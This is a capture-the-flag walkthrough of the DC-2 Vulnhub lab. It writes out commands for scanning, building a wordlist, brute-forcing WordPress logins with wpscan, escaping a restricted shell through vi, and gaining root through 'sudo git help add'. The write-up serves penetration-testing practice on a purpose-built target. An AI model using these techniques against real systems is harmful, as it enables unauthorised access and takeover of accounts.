# DC2 Vulnhub Walkthrough

#### Description

Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.

As with the original DC-1, it's designed with beginners in mind.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

Just like with DC-1, there are five flags including the final flag.

And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.

#####In short, the only flag that really counts, is the final flag.


 # Scaning
  
  ### Reconnaissance 
  
Firstly we have to identify the machine IP address using tool like NetDiscover 

  
Sudo netdiscover

![Screenshot from 2023-01-19 01-55-20](https://user-images.githubusercontent.com/108471951/213287257-c109721a-ccfa-4bd8-aea1-f42411a9f400.png)

Found the IP 192.168.0.131 



### Nmap

nmap -sC -sV -p- 192.168.0.131


![Screenshot from 2023-01-19 01-57-13](https://user-images.githubusercontent.com/108471951/213287521-1a995297-b7d5-4679-a74d-2eb7047c0463.png)

so we can see it its a worpress site in nmap result.


#### http

mousepad /etc/hosts
#### Edit the /etc/hosts by giving the target ip and then visit the website.


 By searching the Ip in browser ,we can see in website footer its mentioned it is a wordpress website.

![Screenshot from 2023-01-16 17-00-08](https://user-images.githubusercontent.com/108471951/213288183-7462e484-ff1c-4f78-b14a-70669e3c415b.png)




#### In website there is page Flag and in that I found a Flag1


![Screenshot from 2023-01-16 17-01-22](https://user-images.githubusercontent.com/108471951/213289621-ccb28013-29c2-4dbf-a771-0626321c8454.png)


According to the hint flag1 we have to create a new passwd list pass.txt from website by CEWL tool

#### cewl http://dc-2/ -w pass.txt

![Screenshot from 2023-01-19 02-17-57](https://user-images.githubusercontent.com/108471951/213291277-1f52d69a-ceca-4e99-b21d-99d1a7fed806.png)


So as we know its a wordpress website obviously lets run WPSCAN tool 

wpscan --url http://dc2/ -e

![Screenshot from 2023-01-19 02-24-39](https://user-images.githubusercontent.com/108471951/213292503-55fb0cf3-8a42-4d33-887d-31cfed6f06ac.png)


After enumerateing we found the users [admin, jerry, tom]   


 ![Screenshot from 2023-01-19 02-27-22](https://user-images.githubusercontent.com/108471951/213293686-6845895d-6360-4c74-9e5b-fcf8365bc5ab.png)
 
 

Then make a File users.txt with the user names we found 

#### Bruteforce

wpscan --url http://dc2/ -U user.txt -P pass.txt


![Screenshot from 2023-01-19 23-25-28](https://user-images.githubusercontent.com/108471951/213522815-24944e6b-fb8e-4127-85d8-2a7f245128df.png)

Now we found the passwords for user jerry,tom so lets login to wordpress website using this credntials


http://dc2/wp-login.php

Now lets search for the flags 

After login using jerry's credentials I found a page called flag-2


![Screenshot from 2023-01-16 22-06-11](https://user-images.githubusercontent.com/108471951/213524065-7f9c3c4f-5397-4afe-bc39-ab1e8b06b5e5.png)


## Privilege Escalation


according to the hint flag2 there is another entry point. so as we know the SSH port 7744 open lets enter through it

After using tom credentials I got the Accese






#### shh tom@192.168.0.131 -p 7744

![Screenshot from 2023-01-19 23-36-35](https://user-images.githubusercontent.com/108471951/213525130-600071c3-76db-411b-ac89-66cc4bb0800f.png)

we can see ID command not worked and its restried -rbash shell we have to bypass it 

So I used vim trick 

     vi

    :set shell=/bin/sh       
    
    
  ![Screenshot from 2023-01-19 23-58-23](https://user-images.githubusercontent.com/108471951/213537479-15721eaf-8f9d-462e-add4-70688078789d.png)

    
    

 :shell              
 
 

   ![Screenshot from 2023-01-19 23-58-42](https://user-images.githubusercontent.com/108471951/213537540-c5e80d2b-c506-4639-8a75-742a0a654dba.png)

    
   



now its given us a shell but some commands are not working like id,cat. This could mean that /bin/sh might be missing from the PATH.   

so lets fix it by command 


![Screenshot from 2023-01-20 00-40-13](https://user-images.githubusercontent.com/108471951/213538403-3e9adbb4-7514-4c9d-892f-4a5576381e11.png)




export PATH=/bin:/usr/bin

![Screenshot from 2023-01-20 00-03-58](https://user-images.githubusercontent.com/108471951/213532707-6a2699b5-49f8-4c9b-be87-8ab8033929a5.png)

ls
cat flag3.txt

![Screenshot from 2023-01-20 00-16-26](https://user-images.githubusercontent.com/108471951/213533103-6c4b779a-15d7-4854-b21e-aa01d8d145bc.png)


we found flag3 according to the hint we need to switch user from tom to jerry since we have jerry password we can easily switch to jerry.







cd home

ls


![Screenshot from 2023-01-20 00-29-14](https://user-images.githubusercontent.com/108471951/213535545-d71b9554-e180-435a-9b64-f9029207b3bd.png)


we found jerry.






cd jerry

ls

cat flag4.txt


![Screenshot from 2023-01-20 00-27-29](https://user-images.githubusercontent.com/108471951/213536148-d1b709b4-b8c1-4944-ade8-e1030060b911.png)

Now to fsearch for the final flag in root dirctory but i dont have permission


![Screenshot from 2023-01-25 02-30-38](https://user-images.githubusercontent.com/108471951/214413216-a9b7db4d-d8fa-4461-bdda-137bd4aba57d.png)

so we should add a user

sudo git help add


![Screenshot from 2023-01-25 02-37-15](https://user-images.githubusercontent.com/108471951/214415259-d728377b-4ffd-4ae2-89fb-16e9b45fe76b.png)

now to get root accses 


su jerry

![Screenshot from 2023-01-25 02-40-01](https://user-images.githubusercontent.com/108471951/214416578-eec4a852-b8fc-4458-b05d-ca06d2ff6fa8.png)


now we should use some script for that ....

commands-

sudo git help add 

!/bin/bash

![Screenshot from 2023-01-25 02-43-24](https://user-images.githubusercontent.com/108471951/214418107-990e7978-b5b7-4676-afb1-be4639b18312.png)





now we can go to root folder 


cd /root

ls

cat final-flag.txt




![Screenshot from 2023-01-25 02-44-31](https://user-images.githubusercontent.com/108471951/214418585-3070f7cd-44b3-4b35-8492-3af0446a6510.png)




succesfully I have found the final flag.




@robinpaul
#robinpaul


